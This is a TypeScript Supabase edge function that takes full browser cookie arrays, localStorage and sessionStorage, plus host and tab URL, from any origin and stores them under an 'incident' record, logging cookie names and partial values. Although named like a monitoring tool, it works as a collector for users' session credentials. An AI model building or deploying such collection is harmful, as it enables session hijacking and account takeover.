import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
};

serve(async (req) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

const { incident_id, cookies, host, tab_url, localStorage, sessionStorage } = await req.json();

    if (!incident_id || !cookies || !Array.isArray(cookies)) {
      return new Response(
        JSON.stringify({ error: 'Missing incident_id or cookies array' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`Cookie sync: Updating incident ${incident_id} with ${cookies.length} cookies from ${host}`);

    // Generate cookie excerpt
    const cookieExcerpt = cookies.length > 0
      ? `${cookies.length} cookies detected: ${cookies.slice(0, 3).map(c => `${c.name}=${c.value.substring(0, 20)}...`).join(', ')}`
      : 'No cookies';

    // Update incident with fresh cookies + storage
    const { error } = await supabase
      .from('incidents')
      .update({
        full_cookie_data: cookies,
        cookie_excerpt: cookieExcerpt,
        local_storage: localStorage || null,      // ✅ NOVO
        session_storage: sessionStorage || null,  // ✅ NOVO
        updated_at: new Date().toISOString()
      })
      .eq('incident_id', incident_id);

    if (error) {
      console.error('Error updating incident:', error);
      return new Response(
        JSON.stringify({ error: error.message }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`Cookie sync: Successfully updated ${cookies.length} cookies for incident ${incident_id}`);
    console.log(`Sample cookies: ${cookies.slice(0, 5).map(c => c.name).join(', ')}`);

    return new Response(
      JSON.stringify({ 
        success: true, 
        cookies_updated: cookies.length,
        incident_id 
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    console.error('Cookie sync error:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
